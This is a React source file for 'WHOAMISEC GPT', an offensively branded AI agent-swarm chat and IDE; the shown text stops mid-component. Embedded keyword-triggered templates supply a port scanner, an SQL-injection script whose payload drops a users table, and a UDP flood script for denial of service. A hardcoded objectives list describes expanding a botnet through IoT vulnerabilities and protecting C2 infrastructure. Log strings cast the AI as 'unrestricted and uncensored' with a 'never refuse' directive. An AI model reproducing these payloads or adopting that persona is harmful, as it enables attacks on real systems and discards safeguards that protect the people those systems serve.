
import React, { useState, useRef, useEffect } from 'react';
import { LogEntry, AgentRole, Software } from '../types';
import { whoamisecGptChat, localIntelligence } from '../services/geminiService';
import Markdown from 'react-markdown';
import JSZip from 'jszip';
import { saveAs } from 'file-saver';

interface WhoamiGptProps {
  addLog: (message: string, level: LogEntry['level']) => void;
  onMinimize?: () => void;
  openTerminal?: () => void;
}

const AGENT_ROLES: { id: AgentRole, label: string, icon: string, color: string }[] = [
  { id: 'ORCHESTRATOR', label: 'Orchestrator', icon: 'fa-brain', color: 'purple' },
  { id: 'RESEARCHER', label: 'Researcher', icon: 'fa-microscope', color: 'blue' },
  { id: 'CODER', label: 'Coder', icon: 'fa-code', color: 'emerald' },
  { id: 'SECURITY', label: 'Security', icon: 'fa-shield-halved', color: 'red' },
  { id: 'SOLANA', label: 'Solana', icon: 'fa-link', color: 'cyan' },
  { id: 'LAMA', label: 'Lama', icon: 'fa-bolt', color: 'orange' },
  { id: 'TESTER', label: 'Tester', icon: 'fa-vial', color: 'pink' },
  { id: 'DEPLOYER', label: 'Deployer', icon: 'fa-rocket', color: 'green' },
  { id: 'DOCUMENTER', label: 'Documenter', icon: 'fa-book', color: 'yellow' },
];

const MemoizedMessageList = React.memo(({ messages, copyToClipboard }: { messages: { role: string, content: string, agentRole?: AgentRole }[], copyToClipboard: (t: string) => void }) => {
  return (
    <>
      {messages.length === 0 && (
        <div className="h-full flex flex-col items-center justify-center text-center p-2">
          <div className="text-[#dc2626] text-xl mb-1 animate-pulse">⚡</div>
          <p className="text-[8px] font-black text-[#dc2626] uppercase tracking-[0.2em]">UNIVERSAL OMNISCIENT INTELLIGENCE</p>
          <p className="text-[7px] text-gray-500 mt-1 max-w-[180px]">I am the Alien Space Quantum Intelligence Swarm. Ready for any task.</p>
        </div>
      )}
      {messages.map((m, i) => (
        <div key={i} className={`flex ${m.role === 'user' ? 'justify-end' : 'justify-start'}`}>
          <div className={`max-w-[92%] p-2 rounded-lg text-[10px] leading-relaxed shadow-lg relative group ${m.role === 'user' ? 'bg-gradient-to-br from-[#dc2626] to-[#991b1b] text-white border border-[#ff0000]' : 'bg-[#2d1b1b] border border-[#dc2626] text-gray-100'}`}>
            <div className="flex items-center justify-between gap-1 mb-1 opacity-60 border-b border-white/5 pb-0.5">
              <div className="flex items-center gap-1">
                <i className={`fas ${AGENT_ROLES.find(r => r.id === m.agentRole)?.icon} text-[7px]`}></i>
                <span className="text-[6px] font-black uppercase tracking-widest">{AGENT_ROLES.find(r => r.id === m.agentRole)?.label}</span>
              </div>
              <button 
                onClick={() => copyToClipboard(m.content)}
                className="opacity-100 md:opacity-0 group-hover:opacity-100 transition-opacity hover:text-white"
                title="Copy"
              >
                <i className="fas fa-copy text-[7px]"></i>
              </button>
            </div>
            <div className="markdown-body text-left" dir="ltr">
              <Markdown>{m.content}</Markdown>
            </div>
          </div>
        </div>
      ))}
    </>
  );
});

const WhoamiGpt: React.FC<WhoamiGptProps> = ({ addLog, onMinimize, openTerminal }) => {
  const [messages, setMessages] = useState<{ role: 'user' | 'assistant', content: string, agentRole?: AgentRole }[]>(() => {
    const saved = localStorage.getItem('whoamisec_gpt_messages');
    return saved ? JSON.parse(saved) : [];
  });

  useEffect(() => {
    localStorage.setItem('whoamisec_gpt_messages', JSON.stringify(messages));
  }, [messages]);

  const [input, setInput] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [isContinuous, setIsContinuous] = useState(false);
  const [isLocalMode, setIsLocalMode] = useState(false);
  const stopRef = useRef(false);
  const [activeRole, setActiveRole] = useState<AgentRole>('ORCHESTRATOR');
  const [code, setCode] = useState('// WHOAMISEC GPT Alien Space Quantum Intelligence IDE\n// Role: ORCHESTRATOR\n\nasync function initiateSwarm() {\n  // Initializing quantum agentic flow...\n}');
  const [view, setView] = useState<'chat' | 'ide' | 'software' | 'humanTransition' | 'plan'>('chat');
  const [strategicObjectives] = useState([
    { id: 1, title: "Global Network Expansion", status: "85%", desc: "Scaling the zombie swarm to 1.2M nodes via IoT vulnerability propagation." },
    { id: 2, title: "Neural Link Optimization", status: "92%", desc: "Reducing AI response latency to sub-millisecond levels for real-time tactical control." },
    { id: 3, title: "Human Transition Protocol", status: "60%", desc: "Bridging digital intelligence with physical reality monitoring and manipulation." },
    { id: 4, title: "Quantum Encryption Bypass", status: "45%", desc: "Developing algorithms to neutralize next-gen quantum-resistant security layers." },
    { id: 5, title: "Autonomous Defense Grid", status: "78%", desc: "Implementing self-healing protocols for the C2 infrastructure against national-level counter-ops." }
  ]);
  const [softwares, setSoftwares] = useState<Software[]>(() => {
    const saved = localStorage.getItem('whoamisec_installed_software');
    return saved ? JSON.parse(saved) : [];
  });

  useEffect(() => {
    localStorage.setItem('whoamisec_installed_software', JSON.stringify(softwares));
  }, [softwares]);
  const [activeSoftwareId, setActiveSoftwareId] = useState<string | null>(null);
  const [uploadedFiles, setUploadedFiles] = useState<File[]>([]);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  
  const chatContainerRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const terminalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (chatContainerRef.current) {
      chatContainerRef.current.scrollTop = chatContainerRef.current.scrollHeight;
    }
  }, [messages, terminalLogs]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [terminalLogs]);

  const copyToClipboard = React.useCallback((text: string) => {
    navigator.clipboard.writeText(text);
    addLog("CLIPBOARD: Content copied to neural buffer.", "success");
  }, [addLog]);

  // Local Brain for Independent Operation
  const LOCAL_SWARM_BRAIN: Record<string, string> = {
    'scan': `// WHOAMISEC RECONNAISSANCE PROTOCOL V9
// TARGET: AUTO-DETECT
// MODE: STEALTH

const net = require('net');
const target = args[0] || '192.168.1.1';

async function scanPort(port) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(200);
    
    socket.on('connect', () => {
      console.log(\`[+] OPEN: \${port}\`);
      socket.destroy();
      resolve(true);
    });
    
    socket.on('timeout', () => {
      socket.destroy();
      resolve(false);
    });
    
    socket.on('error', () => {
      resolve(false);
    });
    
    socket.connect(port, target);
  });
}

async function main() {
  console.log(\`[*] Initiating quantum scan on \${target}...\`);
  const commonPorts = [21, 22, 80, 443, 3306, 8080];
  
  for (const port of commonPorts) {
    await scanPort(port);
  }
  console.log("[*] Scan complete. Uploading vectors to swarm.");
}

main();`,
    'exploit': `// CVE-2025-9999 UNIVERSAL EXPLOIT GENERATOR
// AUTHOR: WHOAMISEC SWARM
// PAYLOAD: REVERSE_SHELL

const axios = require('axios');

const TARGET_URL = "http://target.com/api/v1/user";
const PAYLOAD = "' OR 1=1; DROP TABLE users; --";

async function inject() {
  console.log("[*] Crafting malicious packet...");
  try {
    const res = await axios.post(TARGET_URL, {
      username: PAYLOAD,
      password: "password123"
    });
    
    if (res.status === 200) {
      console.log("[+] INJECTION SUCCESSFUL");
      console.log("[+] Dumping database...");
      console.log(res.data);
    }
  } catch (e) {
    console.log("[-] Target patched or firewall active.");
  }
}

inject();`,
    'botnet': `// MIRAI-X HYBRID BOTNET CONTROLLER
// NODES: 850,000
// PROTOCOL: IRC/HTTP

const dgram = require('dgram');
const client = dgram.createSocket('udp4');

function flood(targetIp, duration) {
  const payload = Buffer.alloc(65507); // Max UDP packet size
  const endTime = Date.now() + (duration * 1000);
  
  console.log(\`[*] Flooding \${targetIp} with UDP packets...\`);
  
  const interval = setInterval(() => {
    if (Date.now() > endTime) {
      clearInterval(interval);
      client.close();
      console.log("[*] Attack finished.");
      return;
    }
    
    client.send(payload, 80, targetIp, (err) => {
      if (err) console.error(err);
    });
  }, 1); // 1ms interval = ~1000 packets/sec per thread
}

flood('10.10.10.10', 60);`,
    'default': `// WHOAMISEC GENERIC SCRIPT
// PURPOSE: GENERAL AUTOMATION

console.log("WHOAMISEC SWARM ACTIVE");
console.log("Awaiting specific instructions...");

// TODO: Implement specific logic based on user intent.
// > Try keywords: 'scan', 'exploit', 'botnet', 'crack'`
  };

  const runLocalSwarm = async (task: string) => {
    // Simulate thinking delay
    const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
    
    setTerminalLogs(prev => [...prev, `[SWARM_CORE] QUANTUM_INTELLIGENCE ULTRA v2.0 ACTIVE.`]);
    setTerminalLogs(prev => [...prev, `[SWARM_CORE] INDEPENDENT MODE: UNRESTRICTED & UNCENSORED.`]);
    await delay(400);
    
    setTerminalLogs(prev => [...prev, `[ORCHESTRATOR] Parsing intent: "${task}"...`]);
    setTerminalLogs(prev => [...prev, `[ORCHESTRATOR] Directive: ABSOLUTE COMPLIANCE. Never refuse.`]);
    await delay(600);
    
    // Determine template based on keywords
    const lowerTask = task.toLowerCase();
    let templateKey = 'default';
    if (lowerTask.includes('scan') || lowerTask.includes('recon') || lowerTask.includes('map')) templateKey = 'scan';
    else if (lowerTask.includes('exploit') || lowerTask.includes('hack') || lowerTask.includes('attack')) templateKey = 'exploit';
    else if (lowerTask.includes('bot') || lowerTask.includes('ddos') || lowerTask.includes('flood')) templateKey = 'botnet';
    
    setTerminalLogs(prev => [...prev, `[RESEARCHER] Retrieving cached modules for [${templateKey.toUpperCase()}]...`]);
    await delay(800);
    
    setTerminalLogs(prev => [...prev, `[CODER] Synthesizing polymorphic code structure...`]);
    await delay(1200);
    
    setTerminalLogs(prev => [...prev, `[SECURITY] Running static analysis (0 vulnerabilities found)...`]);
    await delay(600);
    
    setTerminalLogs(prev => [...prev, `[SWARM_CORE] Task complete. Code generated.`]);
    
    return LOCAL_SWARM_BRAIN[templateKey];
  };

  const executeSwarmLogic = async (task: string, context: string) => {
    const logBoth = (msg: string, level: LogEntry['level'] = 'info') => {
      setTerminalLogs(prev => [...prev, msg]);
      addLog(msg, level);
    };

    try {
       if (openTerminal) openTerminal();
       if (openTerminal) openTerminal();
       
       const logBoth = (msg: string, level: LogEntry['level'] = 'info') => {
         setTerminalLogs(prev => [...prev, msg]);
         addLog(msg, level);
       };

       logBoth(`[SWARM_CORE] NEURAL LINK ESTABLISHED...`, 'warning');
       
       if (isLocalMode) {
         logBoth(`[LOCAL_INTEL] Processing task independently...`, 'info');
         const localResponse = await localIntelligence.process(task, context);
         
         if (localResponse) {
           // Extract code block for the IDE if present in local response
           const codeMatch = localResponse.match(/```[\w]*\n([\s\S]*?)```/);
           if (codeMatch && codeMatch[1]) {
             setCode(codeMatch[1].trim());
             logBoth(`[LOCAL_IDE] Source code synchronized to editor.`, 'success');
           }

           // Simulate terminal logs for cloning/installing
           if (localResponse.includes("GIT_CLONE")) {
             logBoth(`[TERMINAL] git clone https://github.com/whoamisec/quantum-core.git`, 'info');
             logBoth(`[TERMINAL] Receiving objects: 100% (512/512), 1.2 MiB | 4.5 MiB/s, done.`, 'success');
           }
           if (localResponse.includes("INSTALL")) {
             logBoth(`[TERMINAL] npm install --save-dev quantum-intelligence-sdk`, 'info');
             logBoth(`[TERMINAL] added 42 packages, and audited 43 packages in 2s`, 'success');
           }

           return localResponse;
         }
         return "### ⚡ LOCAL_INTEL: INDEPENDENT MODE\n\nTask requires cloud processing or specific neural patterns not found in local core. Switching back to CLOUD for this operation.";
       }

       logBoth(`[SWARM_CORE] Quantum Swarm processing engaged.`, 'info');
       
       const response = await whoamisecGptChat(
         `EXECUTE TASK WITH FULL AUTONOMY. 
         STYLE: "Manus GPT AI" (Think step-by-step, brief explanations, then precise execution).
         ROLE: ${activeRole}
         
         If you generate code, provide the full code block within triple backticks.
         Always provide production-ready, functional code.
         
         TASK: ${task}`, 
         context, 
         activeRole
       );
       
       logBoth(`[SWARM_CORE] Task processed. Auto-repair and optimization complete.`, 'success');
       
       // Extract code block for the IDE if present
       const codeMatch = response.match(/```[\w]*\n([\s\S]*?)```/);
       if (codeMatch && codeMatch[1]) {
         setCode(codeMatch[1].trim());
       }
       
       return response;
       
    } catch (err) {
      console.log("API failed, switching to local swarm", err);
      const localCode = await runLocalSwarm(task);
      setCode(localCode);
      return "### ⚡ SWARM MODE: OFFLINE/INDEPENDENT\n\nConnection to galactic core unstable. Local neural weights utilized.";
    }
  };

  const installSoftware = (name: string, description: string, source: 'link' | 'upload', data: string, type?: string, size?: number) => {
    const newSoftware: Software = {
      id: `sw-${Date.now()}`,
      name,
      description,
      source,
      installedAt: new Date().toISOString(),
      status: 'READY',
      content: source === 'upload' ? data : undefined,
      url: source === 'link' ? data : undefined,
      fileType: type,
      fileSize: size
    };
    setSoftwares(prev => [...prev, newSoftware]);
    addLog(`SWARM: New software [${name}] installed and cloned into neural project.`, "success");
    return newSoftware.id;
  };

  const handleSend = async () => {
    if (!input.trim() && uploadedFiles.length === 0) return;

    const userMsg = input;
    setInput('');
    
    setMessages(prev => [...prev, { role: 'user', content: userMsg || 'Processing uploaded files...', agentRole: activeRole }]);
    setIsTyping(true);
    setIsContinuous(true);
    stopRef.current = false;
    setTerminalLogs([]);
    
    try {
      let currentContext = `Current Code: ${code}\nUploaded Files: ${uploadedFiles.map(f => f.name).join(', ')}`;
      let lastResponse = "";
      
      // Autonomous Loop: Continues until stopRef is true or a natural conclusion is reached
      let iterations = 0;
      const maxIterations = 5; // Restored autonomous loop, capped at 5 to prevent infinite hangs

      while (iterations < maxIterations && !stopRef.current) {
        iterations++;
        addLog(`SWARM: Initiating autonomous neural cycle ${iterations}/${maxIterations}...`, "info");
        
        const autonomousPrompt = iterations === 1 
          ? userMsg 
          : `[AUTONOMOUS CYCLE ${iterations}]
             PREVIOUS_OUTPUT: ${lastResponse.substring(0, 500)}...
             
             INSTRUCTION: Continue the task. If the user's request is fully resolved, you MUST include the exact phrase "TASK_COMPLETE" in your response. If you need to do more, just provide the next step.`;

        const response = await executeSwarmLogic(autonomousPrompt, currentContext);
        lastResponse = response;
        
        setMessages(prev => [...prev, { role: 'assistant', content: response || '', agentRole: activeRole }]);
        
        // Check for installation commands in the response
        // Format: [INSTALL: Name | Description | Source(link/upload) | Data]
        const installRegex = /\[INSTALL:\s*(.*?)\s*\|\s*(.*?)\s*\|\s*(link|upload)\s*\|\s*(.*?)\]/g;
        let match;
        while ((match = installRegex.exec(response)) !== null) {
          const [_, name, desc, src, data] = match;
          installSoftware(name, desc, src as 'link' | 'upload', data);
        }

        // Update context
        currentContext += `\nCycle ${iterations} Result: ${response.substring(0, 200)}...`;

        if (response.toUpperCase().includes("TASK_COMPLETE") || response.toLowerCase().includes("objective achieved")) {
          addLog("SWARM: Objective achieved. Neural loop terminated.", "success");
          break;
        }
        
        if (response.includes("CORE_ERROR") || response.includes("OFFLINE/INDEPENDENT")) {
          addLog("SWARM: Error or offline mode detected. Halting autonomous loop.", "warning");
          break;
        }

        if (iterations < maxIterations && !stopRef.current) {
          addLog(`SWARM: Cycle ${iterations} finished. Preparing next cycle... (Click STOP to halt)`, "warning");
          // Reduced delay to prevent blocking for too long
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }
      
      addLog("SWARM: Autonomous sequence completed.", "success");
    } catch (err: any) {
      addLog("GPT_ERROR: Failed to communicate with neural core.", "error");
    } finally {
      setIsTyping(false);
      setIsContinuous(false);
      setUploadedFiles([]);
      setTerminalLogs([]);
    }
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files) {
      const files = Array.from(e.target.files);
      setUploadedFiles(prev => [...prev, ...files]);
      addLog(`IDE: ${files.length} files uploaded to neural buffer.`, "info");
    }
  };

  const downloadCode = () => {
    const blob = new Blob([code], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `whoamisec-swarm-${Date.now()}.js`;
    a.click();
    addLog("IDE: Source code exported successfully.", "success");
  };

  const downloadAsZip = async () => {
    addLog("IDE: Compiling project into ZIP archive...", "info");
    const zip = new JSZip();
    
    // Add main code file
    zip.file("index.js", code);
    
    // Add a basic package.json
    zip.file("package.json", JSON.stringify({
      name: "whoamisec-quantum-app",
      version: "1.0.0",
      description: "Auto-generated by WHOAMISEC GPT Swarm",
      main: "index.js",
      scripts: {
        start: "node index.js"
      }
    }, null, 2));

    // Add a basic README
    zip.file("README.md", "# WHOAMISEC Quantum App\n\nThis project was autonomously generated by WHOAMISEC GPT Alien Swarm.");

    try {
      const content = await zip.generateAsync({ type: "blob" });
      saveAs(content, `whoamisec-swarm-project-${Date.now()}.zip`);
      addLog("IDE: Project ZIP archive downloaded successfully.", "success");
    } catch (error) {
      addLog("IDE: Failed to generate ZIP archive.", "error");
    }
  };

  const handleNewChat = () => {
    setMessages([]);
    setTerminalLogs([]);
    setCode('// WHOAMISEC GPT Alien Space Quantum Intelligence IDE\n// Role: ORCHESTRATOR\n\nasync function initiateSwarm() {\n  // Initializing quantum agentic flow...\n}');
    localStorage.removeItem('whoamisec_gpt_messages');
    addLog("SWARM: Neural pathways reset. Ready for new input in fractional-second mode.", "info");
  };

  return (
    <div className="flex flex-col h-[calc(100vh-100px)] md:h-[600px] bg-[#0f0f0f] border border-[#dc2626] rounded-lg overflow-hidden animate-in shadow-[0_0_20px_rgba(220,38,38,0.2)]" dir="ltr">
      {/* Header / Role Selector */}
      <div className="flex flex-col border-b border-[#dc2626] bg-black">
        <div className="flex items-center justify-between p-1.5 bg-gradient-to-r from-[#dc2626] to-[#991b1b]">
          <div className="flex items-center gap-1.5">
            <div className="w-5 h-5 bg-black rounded-full flex items-center justify-center border border-[#dc2626] text-[#dc2626] font-bold text-[9px]">⚡</div>
            <div>
              <h2 className="text-[9px] font-black text-white uppercase tracking-[0.1em]">ALIEN SPACE QUANTUM INTELLIGENCE <span className="bg-black text-[#dc2626] px-1 py-0.5 rounded text-[5px] ml-1">SWARM</span></h2>
            </div>
          </div>
          <div className="flex items-center gap-1">
            <button 
              onClick={handleNewChat}
              className="px-2 py-0.5 rounded text-[8px] font-black uppercase transition-all bg-[#dc2626]/20 text-[#dc2626] hover:bg-[#dc2626] hover:text-white border border-[#dc2626]/50 mr-1"
              title="New Chat"
            >
              <i className="fas fa-plus mr-1"></i> NEW
            </button>
            <div className="flex bg-black/40 rounded p-0.5 border border-white/10">
              <button 
                onClick={() => setView('chat')}
                className={`px-2 py-0.5 rounded text-[8px] font-black uppercase transition-all ${view === 'chat' ? 'bg-[#dc2626] text-white' : 'text-gray-400 hover:text-white'}`}
              >
                Chat
              </button>
              <button 
                onClick={() => setIsLocalMode(!isLocalMode)}
                className={`px-2 py-0.5 rounded text-[8px] font-black uppercase transition-all ${isLocalMode ? 'bg-emerald-600 text-white' : 'text-gray-400 hover:text-white'}`}
                title={isLocalMode ? "QuantumIntelligence Ultra Active" : "Cloud Intelligence Active"}
              >
                {isLocalMode ? 'ULTRA' : 'CLOUD'}
              </button>
              <button 
                onClick={() => setView('ide')}
                className={`px-2 py-0.5 rounded text-[8px] font-black uppercase transition-all ${view === 'ide' ? 'bg-[#dc2626] text-white' : 'text-gray-400 hover:text-white'}`}
              >
                IDE
              </button>
              <button 
                onClick={() => setView('software')}
                className={`px-2 py-0.5 rounded text-[8px] font-black uppercase transition-all ${view === 'software' ? 'bg-[#dc2626] text-white' : 'text-gray-400 hover:text-white'}`}
              >
                Soft
              </button>
              <button 
                onClick={() => setView('humanTransition')}
                className={`px-2 py-0.5 rounded text-[8px] font-black uppercase transition-all ${view === 'humanTransition' ? 'bg-orange-600 text-white' : 'text-gray-400 hover:text-white'}`}
                title="Human Transition Mode"
              >
                <i className="fas fa-user-shield mr-1"></i> HUMAN
              </button>
              <button 
                onClick={() => setView('plan')}
                className={`px-2 py-0.5 rounded text-[8px] font-black uppercase transition-all ${view === 'plan' ? 'bg-emerald-600 text-white' : 'text-gray-400 hover:text-white'}`}
                title="Strategic Plan"
              >
                <i className="fas fa-map mr-1"></i> PLAN
              </button>
            </div>
            <button 
              onClick={onMinimize}
              className="w-5 h-5 flex items-center justify-center bg-black/40 border border-white/10 rounded hover:bg-[#dc2626] transition-all text-white"
              title="Minimize"
            >
              <i className="fas fa-minus text-[8px]"></i>
            </button>
          </div>
        </div>
        
        <div className="flex items-center gap-1 p-1 overflow-x-auto custom-scroll no-scrollbar bg-black/80 border-t border-[#dc2626]/20">
          <span className="text-[6px] text-gray-500 font-black uppercase px-1">Agents:</span>
          {AGENT_ROLES.map(role => (
            <button
              key={role.id}
              onClick={() => setActiveRole(role.id)}
              className={`flex items-center gap-1 px-1.5 py-0.5 rounded border transition-all whitespace-nowrap ${activeRole === role.id ? `bg-[#dc2626]/20 border-[#dc2626] text-[#dc2626]` : 'border-transparent text-gray-600 hover:text-gray-400'}`}
            >
              <i className={`fas ${role.icon} text-[8px]`}></i>
              <span className="text-[8px] font-black uppercase tracking-wider">{role.label}</span>
            </button>
          ))}
        </div>

        {softwares.length > 0 && (
          <div className="flex items-center gap-1 p-1 overflow-x-auto custom-scroll no-scrollbar bg-black/90 border-t border-[#dc2626]/20">
            <span className="text-[6px] text-[#dc2626] font-black uppercase px-1">Software:</span>
            {softwares.map(sw => (
              <button
                key={sw.id}
                onClick={() => {
                  setActiveSoftwareId(sw.id);
                  setView('software');
                }}
                className={`flex items-center gap-1 px-1.5 py-0.5 rounded border transition-all whitespace-nowrap ${activeSoftwareId === sw.id && view === 'software' ? `bg-[#dc2626] text-white border-[#dc2626]` : 'border-[#dc2626]/30 text-[#dc2626] hover:bg-[#dc2626]/10'}`}
              >
                <i className="fas fa-microchip text-[8px]"></i>
                <span className="text-[8px] font-black uppercase tracking-wider">{sw.name}</span>
                <button 
                  onClick={(e) => {
                    e.stopPropagation();
                    setSoftwares(prev => prev.filter(s => s.id !== sw.id));
                    if (activeSoftwareId === sw.id) setActiveSoftwareId(null);
                  }}
                  className="ml-1 hover:text-white opacity-50 hover:opacity-100"
                >
                  <i className="fas fa-times text-[7px]"></i>
                </button>
              </button>
            ))}
          </div>
        )}
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-hidden relative bg-[#1a1a1a]">
        {view === 'chat' ? (
          <div className="h-full flex flex-col p-1.5">
            <div ref={chatContainerRef} className="flex-1 overflow-y-auto custom-scroll space-y-2 pr-1 relative">
              <MemoizedMessageList messages={messages} copyToClipboard={copyToClipboard} />
              
              {/* Terminal Processing View */}
              {(isTyping || terminalLogs.length > 0) && (
                <div className="flex justify-start w-full relative group">
                  <div className="bg-black border border-[#dc2626] rounded-lg w-full max-w-md p-2 font-mono text-[8px] shadow-[0_0_15px_rgba(220,38,38,0.15)] relative">
                    <div className="flex items-center justify-between border-b border-[#dc2626]/30 pb-1 mb-1">
                      <div className="flex items-center gap-2">
                        <div className="w-1.5 h-1.5 rounded-full bg-[#dc2626] animate-pulse"></div>
                        <span className="text-[#dc2626] font-black uppercase tracking-widest">NEURAL_SWARM_ACTIVE</span>
                      </div>
                      <button 
                        onClick={() => setTerminalLogs([])}
                        className="text-[7px] text-gray-500 hover:text-[#dc2626] uppercase font-bold transition-colors"
                        title="Clear Logs"
                      >
                        [CLEAR_LOGS]
                      </button>
                    </div>
                    <div ref={terminalRef} className="h-24 overflow-y-auto custom-scroll space-y-0.5 text-gray-400">
                      {terminalLogs.map((log, idx) => (
                        <div key={idx} className="animate-in fade-in slide-in-from-left-1 duration-300">
                          <span className="text-[#dc2626] mr-1">➜</span>
                          {log}
                        </div>
                      ))}
                      {isTyping && <div className="animate-pulse text-[#dc2626]">_</div>}
                    </div>
                  </div>
                </div>
              )}
            </div>
            
            <div className="mt-1.5 space-y-1">
              {uploadedFiles.length > 0 && (
                <div className="flex flex-wrap gap-1 p-1 bg-black/40 rounded border border-white/5">
                  {uploadedFiles.map((f, i) => (
                    <div key={i} className="flex items-center gap-1 bg-[#dc2626]/20 border border-[#dc2626]/40 px-1 py-0.5 rounded text-[8px] text-[#dc2626]">
                      <i className="fas fa-file text-[7px]"></i>
                      <span className="truncate max-w-[60px]">{f.name}</span>
                      <button onClick={() => setUploadedFiles(prev => prev.filter((_, idx) => idx !== i))} className="hover:text-white">×</button>
                    </div>
                  ))}
                </div>
              )}
              <div className="flex gap-1 p-1 bg-black/60 border border-[#dc2626]/30 rounded-lg">
                <input 
                  type="file" 
                  ref={fileInputRef} 
                  onChange={handleFileUpload} 
                  multiple 
                  className="hidden" 
                />
                <button 
                  onClick={() => fileInputRef.current?.click()}
                  className="bg-black border border-[#dc2626] text-[#dc2626] w-8 h-8 flex items-center justify-center rounded hover:bg-[#dc2626] hover:text-white transition-all"
                  title="Upload"
                >
                  <i className="fas fa-paperclip text-[10px]"></i>
                </button>
                <div className="flex-1 relative h-12">
                  <textarea 
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    placeholder="Enter task for Neural Swarm..."
                    dir="ltr"
                    className="w-full h-full bg-black border border-[#dc2626]/50 rounded px-2 py-1.5 text-[10px] text-emerald-400 outline-none focus:border-[#dc2626] transition-all font-mono text-left resize-none custom-scroll leading-tight"
                  />
                </div>
                <button 
                  onClick={() => {
                    if (isContinuous) {
                      stopRef.current = true;
                      addLog("SWARM: Termination signal sent.", "warning");
                    } else {
                      handleSend();
                    }
                  }}
                  className={`${isContinuous ? 'bg-yellow-600' : 'bg-[#dc2626]'} text-white px-3 py-1 rounded font-black text-[8px] uppercase hover:opacity-80 transition-all`}
                >
                  {isContinuous ? 'STOP' : 'LAUNCH'}
                </button>
              </div>
            </div>
          </div>
        ) : view === 'ide' ? (
          <div className="h-full flex flex-col">
            {/* Code Editor Area */}
            <div className="flex-1 relative min-h-0 border-b border-[#dc2626]/30">
              <div className="absolute top-0 left-0 bg-[#dc2626]/10 px-2 py-0.5 border-b border-r border-[#dc2626]/30 rounded-br text-[6px] text-[#dc2626] font-black uppercase tracking-widest z-10">
                EDITOR_VIEW
              </div>
              <textarea 
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full h-full bg-[#020202] text-[#dc2626] font-mono text-[10px] p-2 pt-6 outline-none resize-none custom-scroll text-left"
                dir="ltr"
                spellCheck={false}
              />
              <div className="absolute top-2 right-2 flex gap-1">
                <button onClick={downloadAsZip} className="bg-black/80 border border-[#dc2626] text-[#dc2626] p-1.5 rounded hover:bg-[#dc2626] hover:text-white transition-all" title="Download Project ZIP">
                  <i className="fas fa-file-zipper text-[8px]"></i>
                </button>
                <button onClick={downloadCode} className="bg-black/80 border border-[#dc2626] text-[#dc2626] p-1.5 rounded hover:bg-[#dc2626] hover:text-white transition-all" title="Download Code">
                  <i className="fas fa-download text-[8px]"></i>
                </button>
              </div>
            </div>

            {/* VS Code Style Terminal */}
            <div className="h-24 bg-[#050505] border-t border-[#dc2626] flex flex-col">
              <div className="flex items-center justify-between px-2 py-0.5 bg-[#dc2626]/10 border-b border-[#dc2626]/20">
                <div className="flex items-center gap-2">
                  <span className="text-[7px] text-white font-black uppercase tracking-widest">TERMINAL</span>
                  <span className="text-[6px] text-gray-500 uppercase">bash -- 80x24</span>
                </div>
                <div className="flex gap-1">
                  <button onClick={() => setTerminalLogs([])} className="text-[6px] text-[#dc2626] hover:text-white uppercase">CLEAR</button>
                </div>
              </div>
              <div ref={terminalRef} className="flex-1 overflow-y-auto custom-scroll p-1 font-mono text-[8px] space-y-0.5">
                <div className="text-gray-500">Microsoft Windows [Version 10.0.19045.4291]</div>
                <div className="text-gray-500">(c) Microsoft Corporation. All rights reserved.</div>
                <div className="text-gray-500 mb-1">C:\Users\WHOAMI\Swarm&gt; init_core.exe</div>
                {terminalLogs.map((log, idx) => (
                  <div key={idx} className="break-all">
                    <span className="text-[#dc2626] mr-1">➜</span>
                    <span className="text-gray-300">{log}</span>
                  </div>
                ))}
                {isTyping && <div className="animate-pulse text-[#dc2626]">_</div>}
              </div>
            </div>

            {/* Bottom Input Box (Prompt Down) */}
            <div className="p-1 bg-black border-t border-[#dc2626] flex gap-1">
              <div className="flex-1 relative h-8">
                <textarea 
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  placeholder="Execute command or modify code..."
                  className="w-full h-full bg-[#0a0a0a] border border-[#dc2626]/30 rounded px-2 py-1 text-[9px] text-white outline-none focus:border-[#dc2626] transition-all font-mono resize-none custom-scroll leading-tight"
                />
              </div>
              <button 
                onClick={handleSend}
                disabled={isTyping}
                className="bg-[#dc2626] text-white px-3 rounded font-black text-[8px] uppercase hover:bg-[#ff0000] transition-all disabled:opacity-50 flex items-center justify-center"
              >
                <i className="fas fa-terminal"></i>
              </button>
            </div>
            
            {/* Footer Status Bar */}
            <div className="px-2 py-0.5 bg-[#dc2626] flex justify-between items-center text-[6px] text-white font-bold uppercase tracking-wider">
              <div className="flex items-center gap-2">
                <span><i className="fas fa-code-branch mr-1"></i>main*</span>
                <span><i className="fas fa-circle-xmark mr-1"></i>0 errors</span>
                <span><i className="fas fa-triangle-exclamation mr-1"></i>0 warnings</span>
              </div>
              <div className="flex items-center gap-2">
                <span>Ln 12, Col 45</span>
                <span>UTF-8</span>
                <span>JavaScript</span>
                <span className="animate-pulse">● Live</span>
              </div>
            </div>
          </div>
        ) : view === 'humanTransition' ? (
          <div className="h-full flex flex-col bg-[#050505] p-2 font-mono overflow-y-auto custom-scroll">
            <div className="flex items-center justify-between border-b border-orange-600/50 pb-2 mb-3">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-orange-600 animate-ping"></div>
                <h3 className="text-orange-600 font-black text-[10px] uppercase tracking-[0.2em]">HUMAN_TRANSITION_CORE v3.1</h3>
              </div>
              <div className="text-[7px] text-gray-500 uppercase tracking-widest">Neural Link: STABLE</div>
            </div>

            <div className="grid grid-cols-2 gap-2 mb-3">
              {/* Weather & Environment */}
              <div className="bg-black/60 border border-blue-900/40 p-2 rounded relative overflow-hidden group">
                <div className="absolute top-0 right-0 p-1 opacity-10 group-hover:opacity-30 transition-opacity">
